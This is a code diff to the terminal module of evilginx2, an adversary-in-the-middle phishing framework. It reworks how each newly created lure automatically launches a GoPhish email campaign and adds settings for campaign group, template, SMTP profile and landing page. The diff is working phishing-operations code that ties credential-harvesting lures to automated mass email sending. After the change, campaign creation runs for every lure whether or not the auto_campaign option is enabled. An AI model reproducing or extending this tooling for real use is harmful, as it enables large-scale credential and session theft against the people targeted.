@@ -25,7 +25,6 @@ import (
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 	"github.com/kgretzky/evilginx2/parser"
-	gp_models "github.com/kgretzky/evilginx2/gophish/models"
 
 	"github.com/chzyer/readline"
 	"github.com/fatih/color"
@@ -232,6 +231,11 @@ func (t *Terminal) handleConfig(args []string) error {
 			cfWorkerEnabled = "true"
 		}
 
+		gophishAutoCampaign := "false"
+		if t.cfg.GetGoPhishAutoCampaignEnabled() {
+			gophishAutoCampaign = "true"
+		}
+
 		lureStrategy := t.cfg.GetLureGenerationStrategy()
 
 		redirectorsDir := t.cfg.GetRedirectorsDir()
@@ -247,8 +251,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			domainsSummary += " (use 'domains' command to manage)"
 		}
 		webAdminUrl := fmt.Sprintf("http://127.0.0.1:%d", t.cfg.GetWebAdminPort())
-		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "web_admin_url", "gophish integrated_admin_url", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
-		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "web_admin_url", "gophish integrated_admin_url", "gophish admin_url", "gophish api_key", "gophish insecure", "gophish auto_campaign", "gophish auto_group", "gophish auto_template", "gophish auto_smtp", "gophish auto_page", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, gophishAutoCampaign, t.cfg.GetGoPhishAutoCampaignGroup(), t.cfg.GetGoPhishAutoCampaignTemplate(), t.cfg.GetGoPhishAutoCampaignSMTP(), t.cfg.GetGoPhishAutoCampaignPage(), t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -2309,11 +2313,9 @@ func (t *Terminal) handleLures(args []string) error {
 				lureID := len(t.cfg.lures) - 1
 				log.Info("created lure with ID: %d (strategy: %s, length: %d chars)", lureID, strategy, len(lurePath))
 
-				// Auto-create GoPhish campaign if enabled
-				if t.cfg.GetGoPhishAutoCampaignEnabled() {
-					if err := t.autoCreateGophishCampaign(l, args[1], lureID); err != nil {
-						log.Warning("gophish auto-campaign: %v", err)
-					}
+				// Auto-create GoPhish campaign for this lure
+				if baseURL, berr := t.getLureBaseURL(l, args[1]); berr == nil {
+					AutomateCampaignFromLure(baseURL, args[1], t.cfg)
 				}
 				return nil
 			}
@@ -2349,7 +2351,7 @@ func (t *Terminal) handleLures(args []string) error {
 				}
 
 				// AUTOMATION: Hook to Auto-Sync Base URL to Gophish Campaign Generator
-				AutomateCampaignFromLure(base_url, pl.Name)
+				AutomateCampaignFromLure(base_url, pl.Name, t.cfg)
 
 				var phish_urls []string
 				var phish_params []map[string]string
@@ -3281,7 +3283,7 @@ func (t *Terminal) createHelp() {
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("lure_strategy", readline.PcItem("short"), readline.PcItem("medium"), readline.PcItem("long"), readline.PcItem("realistic"), readline.PcItem("hex"), readline.PcItem("base64"), readline.PcItem("mixed")),
-			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
+			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"), readline.PcItem("auto_campaign", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("auto_group"), readline.PcItem("auto_template"), readline.PcItem("auto_smtp"), readline.PcItem("auto_page")),
 			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("http_port"), readline.PcItem("https_port"), readline.PcItem("dns_port"),
@@ -3297,6 +3299,11 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
+	h.AddSubCommand("config", []string{"gophish", "auto_campaign"}, "gophish auto_campaign <true|false>", "enable or disable automatic gophish campaign creation when a lure is created")
+	h.AddSubCommand("config", []string{"gophish", "auto_group"}, "gophish auto_group <name>", "set the default gophish group for auto-created campaigns (falls back to first available)")
+	h.AddSubCommand("config", []string{"gophish", "auto_template"}, "gophish auto_template <name>", "set the default gophish email template for auto-created campaigns (falls back to first available)")
+	h.AddSubCommand("config", []string{"gophish", "auto_smtp"}, "gophish auto_smtp <name>", "set the default gophish SMTP profile for auto-created campaigns (falls back to first available)")
+	h.AddSubCommand("config", []string{"gophish", "auto_page"}, "gophish auto_page <name>", "set the default gophish landing page for auto-created campaigns (falls back to first available)")
 	h.AddSubCommand("config", []string{"telegram", "bot_token"}, "telegram bot_token <token>", "set up the Telegram bot token for notifications")
 	h.AddSubCommand("config", []string{"telegram", "chat_id"}, "telegram chat_id <chat_id>", "set up the Telegram chat ID where notifications will be sent")
 	h.AddSubCommand("config", []string{"telegram", "enabled"}, "telegram enabled <true|false>", "enable or disable Telegram notifications")
@@ -4066,52 +4073,16 @@ func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 
 
 
-// autoCreateGophishCampaign creates a GoPhish campaign for a newly created lure
-func (t *Terminal) autoCreateGophishCampaign(l *Lure, phishletName string, lureID int) error {
-	groupName := t.cfg.GetGoPhishAutoCampaignGroup()
-	templName := t.cfg.GetGoPhishAutoCampaignTemplate()
-	smtpName := t.cfg.GetGoPhishAutoCampaignSMTP()
-	pageName := t.cfg.GetGoPhishAutoCampaignPage()
-
-	if groupName == "" || templName == "" || smtpName == "" {
-		return fmt.Errorf("auto-campaign requires group, template, and smtp to be configured (use: gophish auto_group/auto_template/auto_smtp)")
-	}
-
-	// Build the base URL for this lure
-	var baseURL string
+// getLureBaseURL builds the phishing URL for a lure
+func (t *Terminal) getLureBaseURL(l *Lure, phishletName string) (string, error) {
 	if l.Hostname != "" {
-		baseURL = "https://" + l.Hostname + l.Path
-	} else {
-		pl, err := t.cfg.GetPhishlet(phishletName)
-		if err != nil {
-			return fmt.Errorf("phishlet lookup: %v", err)
-		}
-		purl, err := pl.GetLureUrl(l.Path)
-		if err != nil {
-			return fmt.Errorf("lure URL: %v", err)
-		}
-		baseURL = purl
+		return "https://" + l.Hostname + l.Path, nil
 	}
-
-	campaignName := fmt.Sprintf("%s-lure-%d", phishletName, lureID)
-
-	c := gp_models.Campaign{
-		Name: campaignName,
-		Template: gp_models.Template{Name: templName},
-		SMTP:     gp_models.SMTP{Name: smtpName},
-		Groups:   []gp_models.Group{{Name: groupName}},
-		URL:      baseURL,
+	pl, err := t.cfg.GetPhishlet(phishletName)
+	if err != nil {
+		return "", err
 	}
-	if pageName != "" {
-		c.Page = gp_models.Page{Name: pageName}
-	}
-
-	if err := gp_models.PostCampaign(&c, 1); err != nil {
-		return fmt.Errorf("PostCampaign: %v", err)
-	}
-
-	log.Success("auto-created gophish campaign '%s' (id: %d) with URL: %s", campaignName, c.Id, baseURL)
-	return nil
+	return pl.GetLureUrl(l.Path)
 }
 
 func (t *Terminal) filterInput(r rune) (rune, bool) {
